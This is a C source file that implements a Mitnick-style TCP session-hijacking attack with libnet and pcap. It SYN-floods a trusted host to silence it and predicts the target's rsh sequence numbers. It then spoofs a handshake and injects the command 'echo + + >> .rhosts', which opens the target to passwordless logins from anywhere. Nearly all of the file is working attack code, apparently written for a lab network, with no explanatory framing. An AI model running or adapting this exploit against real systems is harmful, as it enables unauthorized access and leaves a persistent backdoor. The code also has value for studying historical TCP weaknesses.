#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>


u_long ip_src ,ip_dst;
u_short  port_dst = 514, port_src = 998, port = 1000 ;
char errbuf[LIBNET_ERRBUF_SIZE];
libnet_t *l ;
libnet_ptag_t build_ip,build_tcp,t;

// Data structures for ethernet , TCP  and IP 
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

u_long prev_seq =  0 ;
u_long diff_seq =  0 ;
u_long exploit_seq =  0 ;
int diff = 1 ;


int hit  = 0 ;
int nop = -1 ;
int cnt =  1 ;



void 

exploit(){

		ip_src = libnet_name2addr4(l,"172.16.10.3",LIBNET_DONT_RESOLVE);
		ip_dst = libnet_name2addr4(l,"172.16.10.4",LIBNET_DONT_RESOLVE);

		printf("Sending the next packet HITTT \n");
		build_tcp = libnet_build_tcp(
				port_src,
				port_dst,
				1337,
				libnet_get_prand(LIBNET_PRu32),
				TH_SYN,
				libnet_get_prand(LIBNET_PRu16),
				0, //let the kernal calculate it 
				0,
				LIBNET_TCP_H ,
				NULL,
				0,
				l,
				build_tcp);
		if (build_tcp  == -1 )printf("Error while build_tcp \n");

		t  = libnet_build_ipv4(
		   		LIBNET_TCP_H + LIBNET_IPV4_H  ,
		   		0,
		   		242,
		   		0,
		   		64,
		   		IPPROTO_TCP,
		   		0,
		   		ip_src,
		   		ip_dst,
		   		NULL,
		   		0,
		   		l,
		   		t);

		if (t == -1 )printf("Error while build_ip \n");

		printf("The size of the payload written %d \n",libnet_write(l));


		//ACK spoof 

		printf("Sending the next packet \n");
		build_tcp = libnet_build_tcp(
				port_src,
				port_dst,
				1338,
				exploit_seq+1,
				TH_ACK,
				libnet_get_prand(LIBNET_PRu16),
				0, //let the kernal calculate it 
				0,
				LIBNET_TCP_H ,
				NULL,
				0,
				l,
				build_tcp);
		if (build_tcp  == -1 )printf("Error while build_tcp \n");

		t  = libnet_build_ipv4(
		   		LIBNET_TCP_H + LIBNET_IPV4_H  ,
		   		0,
		   		242,
		   		0,
		   		64,
		   		IPPROTO_TCP,
		   		0,
		   		ip_src,
		   		ip_dst,
		   		NULL,
		   		0,
		   		l,
		   		t);

		if (t == -1 )printf("Error while build_ip \n");
		usleep(25000);
		printf("The size of the ACK SPOOF  payload written %d \n",libnet_write(l));

		// execute the command 

		printf(" The next seq num for ack %lu\n",exploit_seq+1 );
		char  command[] = "0\0tsutomu\0tsutomu\0echo + + >> .rhosts" ;
		int command_len =sizeof(command);

		printf("Sending the next packet \n");
		build_tcp = libnet_build_tcp(
				port_src,
				port_dst,
				1338,
				exploit_seq+1,
				TH_PUSH|TH_ACK,
				libnet_get_prand(LIBNET_PRu16),
				0, //let the kernal calculate it 
				0,
				LIBNET_TCP_H +command_len,
				(uint8_t*)command,
				command_len,
				l,
				build_tcp);
		if (build_tcp  == -1 )printf("Error while build_tcp \n");

		t  = libnet_build_ipv4(
		   		LIBNET_TCP_H + LIBNET_IPV4_H +command_len ,
		   		0,
		   		242,
		   		0,
		   		64,
		   		IPPROTO_TCP,
		   		0,
		   		ip_src,
		   		ip_dst,
		   		NULL,
		   		0,
		   		l,
		   		t);

		if (t == -1 )printf("Error while build_ip \n");
		usleep(25000);
		printf("The size of the ACK SPOOF  payload written %d \n",libnet_write(l));

		printf(" The  ack \n" );
		

		printf("Sending the next packet \n");
		build_tcp = libnet_build_tcp(
				port_src,
				port_dst,
				1338+38,
				exploit_seq+1+2,
				TH_ACK,
				libnet_get_prand(LIBNET_PRu16),
				0, //let the kernal calculate it 
				0,
				LIBNET_TCP_H ,
				 NULL,
				0,
				l,
				build_tcp);
		if (build_tcp  == -1 )printf("Error while build_tcp \n");

		t  = libnet_build_ipv4(
		   		LIBNET_TCP_H + LIBNET_IPV4_H  ,
		   		0,
		   		242,
		   		0,
		   		64,
		   		IPPROTO_TCP,
		   		0,
		   		ip_src,
		   		ip_dst,
		   		NULL,
		   		0,
		   		l,
		   		t);

		if (t == -1 )printf("Error while build_ip \n");
		usleep(25000);
		printf("The size of the ACK SPOOF  payload written %d \n",libnet_write(l));




}
void
read_packets(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{


	printf("READ PACKET\n");
	const struct sniff_ip *ip;
	const struct sniff_tcp *tcp;
	const struct sniff_ethernet *ethernet;

	ethernet = (struct sniff_ethernet *)  packet ;
	ip 		 = (struct sniff_ip 	  *) (packet + SIZE_ETHERNET);
	int size_ip = IP_HL(ip)*4;
	tcp 	 = (struct sniff_tcp 	  *) (packet + SIZE_ETHERNET+size_ip);	



	if(!prev_seq && !diff_seq && !hit){

			prev_seq = htonl(tcp->th_seq);
			printf("READ THE FIRST PACKET \n");
	}

	else if (prev_seq && !diff_seq &!hit){

		diff_seq  = prev_seq -  htonl(tcp->th_seq)  ;
		prev_seq = htonl(tcp->th_seq);
		printf("READ THE SECOND PACKET \n");
		
	}

	else {


		if (!hit){

			if (diff_seq == prev_seq - htonl(tcp->th_seq) ) { printf("WNDOW!! %d \n",diff_seq);	prev_seq = htonl(tcp->th_seq);exploit_seq =  htonl(tcp->th_seq)-diff_seq; hit = 1 ;printf("The sequence number is %lu \n", prev_seq ); printf("The predicted next sequence number is %lu \n", exploit_seq );}
		
			else {

				diff_seq  = prev_seq -  htonl(tcp->th_seq)  ;
				prev_seq = htonl(tcp->th_seq);

			}


		}


	}
	

		
	printf("The sequence number is %lu \n", prev_seq );
	

if(!hit) {	

		//usleep(25000);
		printf("Sending the next packet \n");
		build_tcp = libnet_build_tcp(
				port_src+cnt,
				port_dst,
				libnet_get_prand(LIBNET_PRu32),
				libnet_get_prand(LIBNET_PRu32),
				TH_SYN,
				libnet_get_prand(LIBNET_PRu16),
				0, //let the kernal calculate it 
				0,
				LIBNET_TCP_H ,
				NULL,
				0,
				l,
				build_tcp);
		if (build_tcp  == -1 )printf("Error while build_tcp \n");

		t  = libnet_build_ipv4(
		   		LIBNET_TCP_H + LIBNET_IPV4_H  ,
		   		0,
		   		242,
		   		0,
		   		64,
		   		IPPROTO_TCP,
		   		0,
		   		ip_src,
		   		ip_dst,
		   		NULL,
		   		0,
		   		l,
		   		t);

		if (t == -1 )printf("Error while build_ip \n");

		printf("The size of the payload written %d \n",libnet_write(l));
		cnt++;

	}


	else {

			exploit();
			exit(1);


	}

		
}



int 
main (int argc , char **argv ){



char disable [] = "disable" ;
u_short disable_s = strlen(disable);

/* End Initialisaiton*/

// Initialise the libnet_library

l = libnet_init(
		LIBNET_RAW4,
		"eth0",
		errbuf
		);

libnet_seed_prand (l);
if(!l) printf("Error in libnet_init\n");

ip_src = libnet_name2addr4(l,"143.106.255.39",LIBNET_DONT_RESOLVE);
ip_dst = libnet_name2addr4(l,"172.16.10.3",LIBNET_DONT_RESOLVE);


build_tcp = libnet_build_tcp(
		libnet_get_prand(LIBNET_PRu16),
		port_dst-1,
		libnet_get_prand(LIBNET_PRu32),
		libnet_get_prand(LIBNET_PRu32),
		TH_SYN,
		libnet_get_prand(LIBNET_PRu16),
		0, //let the kernal calculate it 
		0,
		LIBNET_TCP_H + disable_s,
		(uint8_t *)disable,
		disable_s,
		l,
		0);
if (t == -1 )printf("Error while build_tcp \n");

t  = libnet_build_ipv4(
   		LIBNET_TCP_H + LIBNET_IPV4_H  + disable_s,
   		0,
   		242,
   		0,
   		64,
   		IPPROTO_TCP,
   		0,
   		ip_src,
   		ip_dst,
   		NULL,
   		0,
   		l,
   		0);

	int i = 1 ; 
	for(i ; i < 15 ; i ++ ) {
	
	build_tcp = libnet_build_tcp(
		port+i,
		port_dst-1,
		libnet_get_prand(LIBNET_PRu32),
		0,
		TH_SYN,
		32767,
		0, //let the kernal calculate it 
		10,
		LIBNET_TCP_H + disable_s,
		(uint8_t *)disable,
		disable_s,
		l,
		build_tcp);

	printf("Disable:Number of bytes written %d \n ",libnet_write(l));

	}



printf("Starting the sniff ing \n");


ip_src = libnet_name2addr4(l,"172.16.10.2",LIBNET_DONT_RESOLVE);
ip_dst = libnet_name2addr4(l,"172.16.10.4",LIBNET_DONT_RESOLVE);


build_tcp = libnet_build_tcp(
		port_src,
		port_dst,
		libnet_get_prand(LIBNET_PRu32),
		libnet_get_prand(LIBNET_PRu32),
		TH_SYN,
		libnet_get_prand(LIBNET_PRu16),
		0, //let the kernal calculate it 
		0,
		LIBNET_TCP_H ,
		NULL,
		0,
		l,
		build_tcp);
if (build_tcp  == -1 )printf("Error while build_tcp \n");

t  = libnet_build_ipv4(
   		LIBNET_TCP_H + LIBNET_IPV4_H  ,
   		0,
   		242,
   		0,
   		64,
   		IPPROTO_TCP,
   		0,
   		ip_src,
   		ip_dst,
   		NULL,
   		0,
   		l,
   		t);

if (t == -1 )printf("Error while build_ip \n");

	char dev[] = "eth0" ; // device here 
	pcap_t *handle; 
	char filter [] = "tcp[13] == 18 and port 514" ; // add SYN+ACK only to spoof 
	bpf_u_int32 mask , net ;
	struct bpf_program fp;

	if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1)exit(1);
	handle = pcap_open_live(dev,SNAP_LEN,1,1000,errbuf);
	if(pcap_compile(handle,&fp,filter,0,net)==-1) exit(1);
	if(pcap_setfilter(handle,&fp)==-1)exit(1);
	libnet_write(l);
	pcap_loop(handle,nop,read_packets,NULL);


	pcap_freecode(&fp);
	pcap_close(handle);
	return 0 ;
}